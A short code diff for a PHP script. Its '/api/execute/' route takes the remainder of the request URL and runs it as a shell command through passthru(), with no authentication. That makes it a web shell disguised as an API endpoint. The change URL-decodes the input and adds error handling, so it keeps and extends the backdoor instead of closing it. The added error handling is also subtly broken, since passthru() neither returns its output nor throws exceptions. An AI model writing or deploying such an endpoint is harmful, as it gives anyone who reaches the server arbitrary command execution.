@@ -6,8 +6,14 @@ $path = $_SERVER['REQUEST_URI'];
 if (strpos($path, '/api/execute/') === 0) {
 
     $command = substr($path, strlen('/api/execute/'));
-    passthru($command);
-    echo "Shell executed!";
+    try {
+        $decodedCommand = urldecode($command);
+        $output = passthru($decodedCommand);
+        echo $output;
+    } catch (Exception $e) {
+        http_response_code(500);
+        echo "Error: " . $e->getMessage();
+    }
 
 } else {
 
